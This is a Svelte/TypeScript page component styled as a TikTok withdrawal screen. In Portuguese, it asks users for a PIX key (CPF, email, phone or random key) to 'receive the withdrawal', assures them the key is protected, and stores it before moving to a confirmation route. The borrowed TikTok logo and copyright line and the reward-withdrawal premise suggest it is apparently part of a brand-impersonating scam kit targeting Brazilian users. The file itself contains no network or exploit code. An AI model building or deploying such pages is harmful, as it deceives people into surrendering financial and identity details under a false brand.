<script lang="ts">
  import { push } from 'svelte-spa-router';
  import Input from '$lib/components/Input.svelte';

  let pixKey = $state('');
  let keyType = $state<'cpf' | 'email' | 'phone' | 'random'>('cpf');

  function handleContinue() {
    if (pixKey.trim()) {
      localStorage.setItem('pixKey', pixKey);
      localStorage.setItem('pixKeyType', keyType);
      push('/confirm-wd');
    }
  }

  function formatCPF(value: string): string {
    const numbers = value.replace(/\D/g, '');
    return numbers
      .replace(/(\d{3})(\d)/, '$1.$2')
      .replace(/(\d{3})(\d)/, '$1.$2')
      .replace(/(\d{3})(\d{1,2})/, '$1-$2')
      .slice(0, 14);
  }

  function formatPhone(value: string): string {
    const numbers = value.replace(/\D/g, '');
    return numbers
      .replace(/(\d{2})(\d)/, '($1) $2')
      .replace(/(\d{5})(\d)/, '$1-$2')
      .slice(0, 15);
  }

  function handleInputChange(value: string) {
    if (keyType === 'cpf') {
      pixKey = formatCPF(value);
    } else if (keyType === 'phone') {
      pixKey = formatPhone(value);
    } else {
      pixKey = value;
    }
  }

  function getPlaceholder(): string {
    switch (keyType) {
      case 'cpf':
        return '000.000.000-00';
      case 'email':
        return 'seuemail@exemplo.com';
      case 'phone':
        return '(00) 00000-0000';
      case 'random':
        return 'Chave aleatória';
    }
  }
</script>

<div class="min-h-screen bg-black flex flex-col">
  <header class="bg-black py-4 flex justify-center">
    <img src="/assets/tiktok-logo-white.svg" alt="TikTok" class="h-8" />
  </header>

  <main class="flex-1 flex flex-col items-center px-4 pb-8">
    <div class="bg-white rounded-lg w-full max-w-md p-6 shadow-lg">
      <h2 class="text-xl font-semibold text-gray-900 mb-2 text-center">
        Adicionar chave PIX
      </h2>
      <p class="text-gray-500 text-sm text-center mb-6">
        Informe a chave PIX para receber o saque
      </p>

      <div class="grid grid-cols-4 gap-2 mb-6">
        {#each [
          { type: 'cpf', label: 'CPF' },
          { type: 'email', label: 'Email' },
          { type: 'phone', label: 'Celular' },
          { type: 'random', label: 'Aleatória' }
        ] as item}
          <button
            onclick={() => {
              keyType = item.type as typeof keyType;
              pixKey = '';
            }}
            class={`py-2 px-3 rounded-lg text-sm font-medium transition-all ${
              keyType === item.type
                ? 'bg-gray-900 text-white'
                : 'bg-gray-100 text-gray-600 hover:bg-gray-200'
            }`}
          >
            {item.label}
          </button>
        {/each}
      </div>

      <div class="mb-6">
        <label class="block text-sm font-medium text-gray-700 mb-2">
          Chave PIX ({keyType.toUpperCase()})
        </label>
        <Input
          type={keyType === 'email' ? 'email' : 'text'}
          placeholder={getPlaceholder()}
          bind:value={pixKey}
          oninput={handleInputChange}
          class="w-full"
        />
      </div>

      <div class="flex items-start gap-3 p-4 bg-gray-50 rounded-lg mb-6">
        <svg class="w-5 h-5 text-gray-500 flex-shrink-0 mt-0.5" fill="currentColor" viewBox="0 0 20 20">
          <path fill-rule="evenodd" d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z" clip-rule="evenodd" />
        </svg>
        <p class="text-sm text-gray-600">
          Sua chave PIX é protegida e será usada apenas para transferir o saldo para sua conta.
        </p>
      </div>

      <button
        onclick={handleContinue}
        disabled={!pixKey.trim()}
        class={`w-full py-4 rounded-lg font-semibold transition-colors ${
          pixKey.trim()
            ? 'bg-blue-600 text-white hover:bg-blue-700'
            : 'bg-gray-300 text-gray-500 cursor-not-allowed'
        }`}
      >
        Continuar
      </button>
    </div>

    <p class="text-gray-500 text-sm mt-8">© 2025 — TikTok</p>
  </main>
</div>
